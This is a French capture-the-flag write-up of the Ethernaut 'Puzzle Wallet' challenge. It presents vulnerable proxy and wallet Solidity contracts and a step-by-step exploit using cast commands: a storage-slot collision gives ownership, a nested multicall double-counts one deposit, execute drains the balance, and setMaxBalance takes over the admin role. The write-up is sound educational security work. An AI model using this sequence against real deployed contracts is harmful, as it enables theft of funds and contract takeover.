# Puzzle Wallet

## Sommaire

- Code source
- Apercu
- La Faille
- Exploitation


## Code Source

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../helpers/UpgradeableProxy-08.sol";

contract PuzzleProxy is UpgradeableProxy {
    address public pendingAdmin;
    address public admin;

    constructor(address _admin, address _implementation, bytes memory _initData)
        UpgradeableProxy(_implementation, _initData)
    {
        admin = _admin;
    }

    modifier onlyAdmin() {
        require(msg.sender == admin, "Caller is not the admin");
        _;
    }

    function proposeNewAdmin(address _newAdmin) external {
        pendingAdmin = _newAdmin;
    }

    function approveNewAdmin(address _expectedAdmin) external onlyAdmin {
        require(pendingAdmin == _expectedAdmin, "Expected new admin by the current admin is not the pending admin");
        admin = pendingAdmin;
    }

    function upgradeTo(address _newImplementation) external onlyAdmin {
        _upgradeTo(_newImplementation);
    }
}

contract PuzzleWallet {
    address public owner;
    uint256 public maxBalance;
    mapping(address => bool) public whitelisted;
    mapping(address => uint256) public balances;

    function init(uint256 _maxBalance) public {
        require(maxBalance == 0, "Already initialized");
        maxBalance = _maxBalance;
        owner = msg.sender;
    }

    modifier onlyWhitelisted() {
        require(whitelisted[msg.sender], "Not whitelisted");
        _;
    }

    function setMaxBalance(uint256 _maxBalance) external onlyWhitelisted {
        require(address(this).balance == 0, "Contract balance is not 0");
        maxBalance = _maxBalance;
    }

    function addToWhitelist(address addr) external {
        require(msg.sender == owner, "Not the owner");
        whitelisted[addr] = true;
    }

    function deposit() external payable onlyWhitelisted {
        require(address(this).balance <= maxBalance, "Max balance reached");
        balances[msg.sender] += msg.value;
    }

    function execute(address to, uint256 value, bytes calldata data) external payable onlyWhitelisted {
        require(balances[msg.sender] >= value, "Insufficient balance");
        balances[msg.sender] -= value;
        (bool success,) = to.call{value: value}(data);
        require(success, "Execution failed");
    }

    function multicall(bytes[] calldata data) external payable onlyWhitelisted {
        bool depositCalled = false;
        for (uint256 i = 0; i < data.length; i++) {
            bytes memory _data = data[i];
            bytes4 selector;
            assembly {
                selector := mload(add(_data, 32))
            }
            if (selector == this.deposit.selector) {
                require(!depositCalled, "Deposit can only be called once");
                // Protect against reusing msg.value
                depositCalled = true;
            }
            (bool success,) = address(this).delegatecall(data[i]);
            require(success, "Error while delegating call");
        }
    }
}
```

## Apercu

Puzzle wallet est le 24 eme challenge sur ethernaut (plateforme ctf blockchain par OpenZeppelin)

Ce challenge a deux contrats, un proxy et un contrat d'implementation. Le code permet de regroupper plusieurs transactions en une seule via une fonction multicall et un systeme de privilleges pour les apels de fonction (admin, owner, whitelist)

Le but du challenge est de devenir admin du proxy

## Explication de la faille

| Hierarchie | Autorisations |
|----------|--------|
| **Admin** | peut appeler seulement les fonctions du contrat proxy |
| **Owner** | peut apeller toutes les fonctions du contrat d'implementation |
| **Whithelist** | peut appeler le fameux multicall et quelques fonctions interesantes si dessous


| Whithelist fonctions | Fonctionnement |
|----------|--------|
| **Multicall** | execute une ou plusieurs fonctions via un delegateCall |
| **Execute** | execute une fonction via un .call sur une adresse et une value passe en parametre|
| **Deposit** | permet de deposer de l'eth sur le proxy
| **setMaxBalance** | permet de set la valeur max de la balance du proxy

Le premier detail qui est vulnerable est l'allignement des layout de storage

Quand un contrat A fait un gelegate call vers un contrat B il execute le code sur le contrat B en utilisant le layer de storage du contrat A.
Pour faire simple l'endroit ou est stockee une variable en solidity (le "slot") est liee a l'ordre de declaration

```
uint a; // slot 0
uint b; // slot 1
```

regardons les contrat donnes pour ce challenge

```
contract PuzzleProxy is UpgradeableProxy {
    address public pendingAdmin;
    address public admin;
    ...
    ...
}

contract PuzzleWallet {
    address public owner;
    uint256 public maxBalance;
    ...
    ...
}

```
si on arrive a modifier maxBalance dans PuzzleWallet il va juste chercher a quel slot il est declarer sur son contrat (deuxieme variable declaree = slot 1) et vu que l'apel vient d'un delegate call il va modifier le storage du contrat appelant (dans ce cas la le proxy) et qu'est ce qui ce trouve au slot 1 du contrat appelant : address public admin;

donc si on modifie maxBalance de PuzzleWallet en passant par le contrat proxy c'est admin qui sera modifier

## Exploitation 

Bon j'ai trouver la faille mais on ne peut pas directement modifier maxbalance ce serait trop facile, cependant init() permet de le faire a condition que maxBalance soit a 0

il y a une fonction setMaxBalance mais on doit etre whitelist et la balance du contrat doit etre a 0 (elle contient 0.001 eth)

On va dabord essayer de ce whitelist pour ca il y a une fonction qui permet d'ajouter une adresse whitelist mais il fait etre owner pour faire ceci.

Sur le contrat proxy il y a cette fonction :

```
function proposeNewAdmin(address _newAdmin) external {
        pendingAdmin = _newAdmin;
    }
```

qui modifie pending admin qui est au slot 0 du proxy, le slot 0 de l'implementation est la variable owner, encore une autre faille.

On va donc apeller la fonction proposeNewAdmin() avec notre adresse en paramettre pour que lorsqu'on apellera l'implementation via le proxy, l'adresse stockee dans owner sera la notre 

```
cast send $TARGET "proposeNewAdmin(address)" 0x...monadresse... -r $RPC --private-key $PK
```

pour verifier je vais apeller le getter cree pour owner car il est declare en public 

```
cast call $TARGET "owner()" -r $RPC

0x00000000000000000000000000000000000000000000000000000monaddresse
```

Bingo je suis desormais owner du contrat d'implementation je peut donc me whitelist

```
cast send $TARGET "addToWhitelist(address)" 0x...monadresse... -r $RPC --private-key $PK
```

La suite est plus technique regardons en detail le multicall
```
function multicall(bytes[] calldata data) external payable onlyWhitelisted {
    bool depositCalled = false;
    for (uint256 i = 0; i < data.length; i++) {
        bytes memory _data = data[i];
        bytes4 selector;
        assembly {
            selector := mload(add(_data, 32))
        }
        if (selector == this.deposit.selector) {
            require(!depositCalled, "Deposit can only be called once");
            // Protect against reusing msg.value
            depositCalled = true;
        }
        (bool success,) = address(this).delegatecall(data[i]);
        require(success, "Error while delegating call");
    }
}
```

Cette fonction est le coeur du challenge elle permet d'appeler plusieurs fonctions en une transaction.

Pour ca elle prend un tableau de type bytes, chaque element de ce tableau est une fonction abi encoder

Elle boucle sur chaque element du tableau et execute la fonction associee via un delegatte call

Le probleme avec le delegate call est que le contexte d'execution esr preserve donc on peut appeler plusieurs fonctions qui recevront le meme msg.value que jaurais envoyer pendant cette tx 

Par exemple jenvoie 1 eth dans un multicall qui contient 3 fonctions, si chaque fonction appelee lit le msg.value elle vera 1 eth donc ce msg.value peut potentiellement etre executer N fois alors que je laurais envoyer une seule fois

Pour palier le probleme cette fonction check quon n'apelle pas deux fois deposit() en comparant le selector de la fonction apelle dans le multicall et le selector de deposit() car on pourrais envoyer 1 eth mais incrementer en boucle notre balance pour y avoir 10eth par exemple et par la suite les retirer (J'aurais envoyer 1eth et retirer 10eth ou le montant que jaurais envie)

On va tenter de bypass cette verification .

Pour ce faire on va faire apeller cette fonction de cette maniere :
```
multicall(deposit(), multicall(deposit())) value 0.001 eth

```

Ainsi le premier deposit va passer, ma balance passe a 0.001 eth et celle du contrat a 0.002 eth et le point le plus important  

```
depositCalled = true;
```

Je suis censer ne plus pouvoir appeler deposit() sauf que la deuxieme fonction que japelle n'est pas deposit mais multicall a nouveau qui va repasser sur la ligne 
```
bool depositCalled = false;
```
Ainsi je peut re appeler deposit qui passe ma balance a 0.002 eth et ne touche pas celle du contrat car je nai rien reenvoyer

Maintenant je peut donc apeler execute() qui a le meme fonctionement quune fonction withdraw() et je peut vider le contrat, qui me permettra enfin d'appeler la fameuse fonction setMaxBalance() et devenir admin sur le proxy

Pour ceci il fait d'abbord encoder deposit() puis encoder multicall(deposit())

```
cast calldata "deposit()"
0xd0e30db0

cast calldata "multicall(bytes[])" '[0xd0e30db0]'
0xac9650d80000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000004d0e30db000000000000000000000000000000000000000000000000000000000
```

on a deposit et multicall(deposit()) encoder il suffit d'appeler multicall avec ces deux valeurs

```
cast send $TARGET "multicall(bytes[])" '[0xd0e30db0, 0xac9650d80000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000004d0e30db000000000000000000000000000000000000000000000000000000000]' --value 0.001ether -r $RPC --private-key $PK
```

et on peut verifier si ceci a bien fonctionne
```
cast balance $TARGET -r $RPC
2000000000000000

cast call $TARGET "balances(address)" 0x..monadresse... -r $RPC
0x00000000000000000000000000000000000000000000000000071afd498d0000
```
71afd498d0000 = 2000000000000000

On peut maintenant vider le contrat

```
cast send $TARGET "execute(address,uint256,bytes)" 0x...monadresse... 2000000000000000 "0x" -r $RPC --private-key $PK

cast balance $TARGET -r $RPC
0
```

on reunni donc toutes les conditions pour setMaxBalance()

```
cast send $TARGET "setMaxBalance(uint256)" 0x...monadresse... -r $RPC --private-key $PK

cast call $TARGET "admin()" -r $RPC
0x00000000000000000000000000000000000000000000000000000monaddresse
```

Et voila challenge finit, ce challenge nous fait bien comprendre la dangerosite des delegate call et l'importance de bien penser au layers de storage quand on code un smartcontrat
